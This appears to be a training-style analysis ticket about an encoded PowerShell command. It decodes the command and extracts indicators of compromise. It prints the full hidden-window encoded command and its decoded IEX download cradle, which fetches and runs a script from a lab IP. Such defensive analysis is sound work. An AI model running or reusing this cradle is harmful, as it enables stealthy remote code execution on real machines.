# TICKET 7 — Encoded Command Analysis

## powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQAwAC4ANQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA

---

## 1. Spot encoded commands

-nop is used for no profile, which means this activity will not open user settings  
-w hidden is used to hide window, which means this activity will be hidden from the user’s screen and will happen in the background.  
-enc is used to to encode the command.

---

## 2. Why encoding is used

-enc is used to encode a powershell command to hide it from analysis and detection. In this way, a malicious script, a malicious command can be run without being detected. It is being used for stealth execution. It avoids antivirus signature matching, detection rules, executes payload in memory.

---

## 3. Decode

After decoding the encoded part, following was revealed:

IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/payload.ps1')

IEX(Invoke-Expression) is used execute the code directly in the memory. Which downloads a script from the remote server.

---

## IOC EXTRACTION NOTES

### Network IOCs:
http://10.10.10.5/payload.ps1

### Process IOCs:
IEX(Invoke-Expression)  
powershell.exe  
Net.WebClient  

### Behavioral IOCs:
Remote script download  
Base64 encoding  
Window Hidden  
No Profile
